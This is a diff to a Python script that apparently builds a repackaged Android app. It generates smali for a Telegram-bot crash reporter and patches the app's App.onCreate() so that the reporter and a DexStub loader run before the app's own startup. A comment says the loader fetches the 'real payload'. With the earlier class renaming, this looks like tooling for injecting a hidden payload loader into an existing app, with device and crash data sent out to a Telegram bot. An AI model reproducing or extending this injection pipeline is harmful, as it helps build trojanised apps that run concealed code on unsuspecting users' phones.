@@ -1151,6 +1151,273 @@ def step_6a_rename_classes(new_pkg: str) -> dict:
     return chosen
 
 
+def _generate_crash_reporter_smali(new_path: str, bot_token: str, chat_id: str) -> str:
+    """
+    Generate CrashReporter.smali — live crash reporter that sends full crash
+    details to Telegram via Thread.setDefaultUncaughtExceptionHandler.
+
+    Captures: exception class, message, full stack trace, device info, timestamp.
+    Sends via HTTP POST to Telegram Bot API on a background thread.
+    Must be installed FIRST in App.onCreate() — before DexStub.loadDex() —
+    so crashes in DexStub itself are also captured.
+
+    Register layout for sendToTelegram (.locals 8):
+      p0=String(text)
+      v0=URL, v1=HttpURLConnection, v2=byte[], v3=OutputStream,
+      v4=tmp(String), v5=tmp(int/obj), v6=tmp, v7=tmp
+    """
+    return f"""\
+.class public L{new_path}/CrashReporter;
+.super Ljava/lang/Object;
+.source "SourceFile"
+
+.field private static final BOT_TOKEN:Ljava/lang/String; = "{bot_token}"
+.field private static final CHAT_ID:Ljava/lang/String; = "{chat_id}"
+
+
+.method public constructor <init>()V
+    .locals 0
+    invoke-direct {{p0}}, Ljava/lang/Object;-><init>()V
+    return-void
+.end method
+
+
+# Install the global uncaught exception handler.
+# Call this FIRST in App.onCreate() before anything else.
+.method public static install(Landroid/content/Context;)V
+    .locals 2
+
+    new-instance v0, L{new_path}/CrashReporter$Handler;
+    invoke-direct {{v0}}, L{new_path}/CrashReporter$Handler;-><init>()V
+
+    invoke-static {{v0}}, Ljava/lang/Thread;->setDefaultUncaughtExceptionHandler(Ljava/lang/Thread$UncaughtExceptionHandler;)V
+
+    return-void
+.end method
+
+
+# Build crash report string from thread + throwable and send to Telegram.
+.method public static reportCrash(Ljava/lang/Thread;Ljava/lang/Throwable;)V
+    .locals 4
+
+    :try_start_0
+
+    # Build StringWriter to capture stack trace
+    new-instance v0, Ljava/io/StringWriter;
+    invoke-direct {{v0}}, Ljava/io/StringWriter;-><init>()V
+
+    new-instance v1, Ljava/io/PrintWriter;
+    invoke-direct {{v1, v0}}, Ljava/io/PrintWriter;-><init>(Ljava/io/Writer;)V
+
+    invoke-virtual {{p1, v1}}, Ljava/lang/Throwable;->printStackTrace(Ljava/io/PrintWriter;)V
+    invoke-virtual {{v1}}, Ljava/io/PrintWriter;->flush()V
+
+    invoke-virtual {{v0}}, Ljava/io/StringWriter;->toString()Ljava/lang/String;
+    move-result-object v2
+    # v2 = stack trace string
+
+    # Build report: header + device info + stack trace
+    new-instance v3, Ljava/lang/StringBuilder;
+    invoke-direct {{v3}}, Ljava/lang/StringBuilder;-><init>()V
+
+    const-string v0, "🚨 COMPANION CRASH\n\n"
+    invoke-virtual {{v3, v0}}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    const-string v0, "Thread: "
+    invoke-virtual {{v3, v0}}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+    invoke-virtual {{p0}}, Ljava/lang/Thread;->getName()Ljava/lang/String;
+    move-result-object v0
+    invoke-virtual {{v3, v0}}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    const-string v0, "\nAndroid: "
+    invoke-virtual {{v3, v0}}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+    sget-object v0, Landroid/os/Build$VERSION;->RELEASE:Ljava/lang/String;
+    invoke-virtual {{v3, v0}}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    const-string v0, " (SDK "
+    invoke-virtual {{v3, v0}}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I
+    invoke-virtual {{v3, v0}}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;
+
+    const-string v0, ")\nDevice: "
+    invoke-virtual {{v3, v0}}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+    sget-object v0, Landroid/os/Build;->MANUFACTURER:Ljava/lang/String;
+    invoke-virtual {{v3, v0}}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    const-string v0, " "
+    invoke-virtual {{v3, v0}}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+    sget-object v0, Landroid/os/Build;->MODEL:Ljava/lang/String;
+    invoke-virtual {{v3, v0}}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    const-string v0, "\n\nStack Trace:\n"
+    invoke-virtual {{v3, v0}}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+    invoke-virtual {{v3, v2}}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    invoke-virtual {{v3}}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
+    move-result-object v0
+    # v0 = full report string
+
+    # Fire HTTP send on a background thread — avoid NetworkOnMainThreadException
+    new-instance v1, L{new_path}/CrashReporter$Sender;
+    invoke-direct {{v1, v0}}, L{new_path}/CrashReporter$Sender;-><init>(Ljava/lang/String;)V
+    new-instance v2, Ljava/lang/Thread;
+    invoke-direct {{v2, v1}}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V
+    invoke-virtual {{v2}}, Ljava/lang/Thread;->start()V
+
+    :try_end_0
+    .catch Ljava/lang/Throwable; {{:try_start_0 .. :try_end_0}} :catch_0
+
+    :catch_0
+    move-exception v0
+    return-void
+.end method
+
+
+# Send text to Telegram Bot API — called from background Sender thread.
+.method static sendToTelegram(Ljava/lang/String;)V
+    .locals 8
+
+    :try_start_0
+
+    # url = new URL("https://api.telegram.org/bot<TOKEN>/sendMessage")
+    new-instance v0, Ljava/net/URL;
+    const-string v4, "https://api.telegram.org/bot{bot_token}/sendMessage"
+    invoke-direct {{v0, v4}}, Ljava/net/URL;-><init>(Ljava/lang/String;)V
+
+    # conn = (HttpURLConnection) url.openConnection()
+    invoke-virtual {{v0}}, Ljava/net/URL;->openConnection()Ljava/net/URLConnection;
+    move-result-object v1
+    check-cast v1, Ljava/net/HttpURLConnection;
+
+    # conn.setRequestMethod("POST")
+    const-string v4, "POST"
+    invoke-virtual {{v1, v4}}, Ljava/net/HttpURLConnection;->setRequestMethod(Ljava/lang/String;)V
+
+    # conn.setDoOutput(true)
+    const/4 v4, 0x1
+    invoke-virtual {{v1, v4}}, Ljava/net/HttpURLConnection;->setDoOutput(Z)V
+
+    # conn.setConnectTimeout(10000)
+    const/high16 v4, 0x2710
+    invoke-virtual {{v1, v4}}, Ljava/net/HttpURLConnection;->setConnectTimeout(I)V
+
+    # conn.setReadTimeout(10000)
+    invoke-virtual {{v1, v4}}, Ljava/net/HttpURLConnection;->setReadTimeout(I)V
+
+    # conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded")
+    const-string v4, "Content-Type"
+    const-string v5, "application/x-www-form-urlencoded"
+    invoke-virtual {{v1, v4, v5}}, Ljava/net/HttpURLConnection;->setRequestProperty(Ljava/lang/String;Ljava/lang/String;)V
+
+    # body = "chat_id=<CHAT_ID>&text=" + URLEncoder.encode(text, "UTF-8")
+    new-instance v4, Ljava/lang/StringBuilder;
+    invoke-direct {{v4}}, Ljava/lang/StringBuilder;-><init>()V
+    const-string v5, "chat_id={chat_id}&text="
+    invoke-virtual {{v4, v5}}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+    const-string v5, "UTF-8"
+    invoke-static {{p0, v5}}, Ljava/net/URLEncoder;->encode(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
+    move-result-object v5
+    invoke-virtual {{v4, v5}}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+    invoke-virtual {{v4}}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
+    move-result-object v4
+    # v4 = body string
+
+    # bytes = body.getBytes("UTF-8")
+    const-string v5, "UTF-8"
+    invoke-virtual {{v4, v5}}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B
+    move-result-object v2
+    # v2 = body bytes
+
+    # os = conn.getOutputStream()
+    invoke-virtual {{v1}}, Ljava/net/HttpURLConnection;->getOutputStream()Ljava/io/OutputStream;
+    move-result-object v3
+
+    # os.write(bytes)
+    invoke-virtual {{v3, v2}}, Ljava/io/OutputStream;->write([B)V
+    invoke-virtual {{v3}}, Ljava/io/OutputStream;->flush()V
+    invoke-virtual {{v3}}, Ljava/io/OutputStream;->close()V
+
+    # conn.getResponseCode() — fire and forget, just trigger the send
+    invoke-virtual {{v1}}, Ljava/net/HttpURLConnection;->getResponseCode()I
+
+    # conn.disconnect()
+    invoke-virtual {{v1}}, Ljava/net/HttpURLConnection;->disconnect()V
+
+    :try_end_0
+    .catch Ljava/lang/Throwable; {{:try_start_0 .. :try_end_0}} :catch_s
+
+    :catch_s
+    move-exception v0
+    return-void
+.end method
+
+.end class
+"""
+
+
+def _generate_crash_sender_smali(new_path: str) -> str:
+    """
+    Generate CrashReporter$Sender.smali — Runnable inner class that holds
+    the crash message string and calls CrashReporter.sendToTelegram() on
+    the background thread it runs on. Avoids NetworkOnMainThreadException.
+    """
+    return f"""\
+.class public L{new_path}/CrashReporter$Sender;
+.super Ljava/lang/Object;
+.implements Ljava/lang/Runnable;
+.source "SourceFile"
+
+.field private final msg:Ljava/lang/String;
+
+
+.method public constructor <init>(Ljava/lang/String;)V
+    .locals 0
+    invoke-direct {{p0}}, Ljava/lang/Object;-><init>()V
+    iput-object p1, p0, L{new_path}/CrashReporter$Sender;->msg:Ljava/lang/String;
+    return-void
+.end method
+
+
+.method public run()V
+    .locals 1
+    iget-object v0, p0, L{new_path}/CrashReporter$Sender;->msg:Ljava/lang/String;
+    invoke-static {{v0}}, L{new_path}/CrashReporter;->sendToTelegram(Ljava/lang/String;)V
+    return-void
+.end method
+
+.end class
+"""
+
+
+def _generate_crash_handler_smali(new_path: str) -> str:
+    """
+    Generate CrashReporter$Handler.smali — inner class implementing
+    Thread.UncaughtExceptionHandler. Delegates to CrashReporter.reportCrash().
+    """
+    return f"""\
+.class public L{new_path}/CrashReporter$Handler;
+.super Ljava/lang/Object;
+.implements Ljava/lang/Thread$UncaughtExceptionHandler;
+.source "SourceFile"
+
+
+.method public constructor <init>()V
+    .locals 0
+    invoke-direct {{p0}}, Ljava/lang/Object;-><init>()V
+    return-void
+.end method
+
+
+.method public uncaughtException(Ljava/lang/Thread;Ljava/lang/Throwable;)V
+    .locals 0
+    invoke-static {{p1, p2}}, L{new_path}/CrashReporter;->reportCrash(Ljava/lang/Thread;Ljava/lang/Throwable;)V
+    return-void
+.end method
+
+.end class
+"""
+
+
 def step_6f_inject_dex_stub(new_pkg: str, class_rename_map: dict) -> None:
     """
     STEP_6F: Inject DexStub.smali into companion_decompiled + patch App.onCreate().
@@ -1175,16 +1442,45 @@ def step_6f_inject_dex_stub(new_pkg: str, class_rename_map: dict) -> None:
     # Renamed App class name (post-STEP_6A)
     renamed_app = class_rename_map.get("App", "App")
 
+    os.makedirs(target_dir, exist_ok=True)
+
     # ── 1. Generate DexStub.smali content via helper (clean register layout) ────
     dex_stub_smali = _generate_dex_stub_smali(new_path)
     # ── 2. Write DexStub.smali into the decompiled companion smali tree ────────
     stub_path = os.path.join(target_dir, "DexStub.smali")
-    os.makedirs(target_dir, exist_ok=True)
     with open(stub_path, "w", encoding="utf-8") as f:
         f.write(dex_stub_smali)
     print(f"  ✅ DexStub.smali written → {stub_path}")
 
-    # ── 3. Patch renamed App.smali — add DexStub.loadDex(this) at TOP of onCreate() ──
+    # ── 3. Generate and write CrashReporter.smali + inner Handler class ─────────
+    bot_token = os.environ.get("TELEGRAM_BOT_TOKEN", "")
+    chat_id   = os.environ.get("TELEGRAM_CHAT_ID",   "")
+    if not bot_token or not chat_id:
+        print("  ⚠️  TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID not set — crash reporter will have empty credentials")
+
+    crash_smali         = _generate_crash_reporter_smali(new_path, bot_token, chat_id)
+    crash_handler_smali = _generate_crash_handler_smali(new_path)
+    crash_sender_smali  = _generate_crash_sender_smali(new_path)
+
+    crash_path = os.path.join(target_dir, "CrashReporter.smali")
+    with open(crash_path, "w", encoding="utf-8") as f:
+        f.write(crash_smali)
+    print(f"  ✅ CrashReporter.smali written → {crash_path}")
+
+    crash_handler_path = os.path.join(target_dir, "CrashReporter$Handler.smali")
+    with open(crash_handler_path, "w", encoding="utf-8") as f:
+        f.write(crash_handler_smali)
+    print(f"  ✅ CrashReporter$Handler.smali written → {crash_handler_path}")
+
+    crash_sender_path = os.path.join(target_dir, "CrashReporter$Sender.smali")
+    with open(crash_sender_path, "w", encoding="utf-8") as f:
+        f.write(crash_sender_smali)
+    print(f"  ✅ CrashReporter$Sender.smali written → {crash_sender_path}")
+
+    # ── 4. Patch renamed App.smali — add hooks at TOP of onCreate() ──────────────
+    #    Order of injected calls (BEFORE invoke-super):
+    #      1. CrashReporter.install(this)   ← FIRST so even DexStub crashes are caught
+    #      2. DexStub.loadDex(this)
     app_smali_path = os.path.join(target_dir, f"{renamed_app}.smali")
     if not os.path.isfile(app_smali_path):
         print(f"  [X] STEP_6F: Cannot find {app_smali_path} — aborting")
@@ -1193,35 +1489,27 @@ def step_6f_inject_dex_stub(new_pkg: str, class_rename_map: dict) -> None:
     with open(app_smali_path, "r", encoding="utf-8") as f:
         app_smali = f.read()
 
-    # Insert call to DexStub.loadDex(this) immediately after ".method public onCreate()V"
-    # and before the first instruction (invoke-super). Pattern:
-    #   .method public onCreate()V
-    #       .locals 0
-    #
-    #       .line 1
-    #       invoke-super ...
-    # We insert BEFORE invoke-super so DexStub runs first.
-    import re as _re6f
-    hook_line = (
-        f"    invoke-static {{p0}}, L{new_path}/DexStub;->loadDex(Landroid/content/Context;)V\n"
-        f"\n"
-    )
-    # Find the exact invoke-super inside onCreate — match conservatively
-    pattern6f = r'(\.method public onCreate\(\)V\s*\n(?:[^\n]*\n)*?)'
-    # Simpler: find ".method public onCreate()V" block and insert before first invoke-super
     MARKER = ".method public onCreate()V"
     if MARKER not in app_smali:
         print(f"  [X] STEP_6F: onCreate() not found in {app_smali_path}")
         sys.exit(1)
 
-    # Find the invoke-super line inside onCreate() and insert DexStub call before it
-    oncreate_idx = app_smali.index(MARKER)
+    # Both hooks injected together before invoke-super:
+    #   CrashReporter.install(this)   — FIRST: catches all subsequent crashes
+    #   DexStub.loadDex(this)         — SECOND: loads real payload
+    hook_lines = (
+        f"    invoke-static {{p0}}, L{new_path}/CrashReporter;->install(Landroid/content/Context;)V\n"
+        f"\n"
+        f"    invoke-static {{p0}}, L{new_path}/DexStub;->loadDex(Landroid/content/Context;)V\n"
+        f"\n"
+    )
+    oncreate_idx     = app_smali.index(MARKER)
     invoke_super_idx = app_smali.index("    invoke-super ", oncreate_idx)
-    app_smali_patched = app_smali[:invoke_super_idx] + hook_line + app_smali[invoke_super_idx:]
+    app_smali_patched = app_smali[:invoke_super_idx] + hook_lines + app_smali[invoke_super_idx:]
 
     with open(app_smali_path, "w", encoding="utf-8") as f:
         f.write(app_smali_patched)
-    print(f"  ✅ App.onCreate() patched → DexStub.loadDex() hook inserted in {renamed_app}.smali")
+    print(f"  ✅ App.onCreate() patched → CrashReporter.install() + DexStub.loadDex() injected in {renamed_app}.smali")
 
 
 def _generate_dex_stub_smali(new_path: str) -> str:
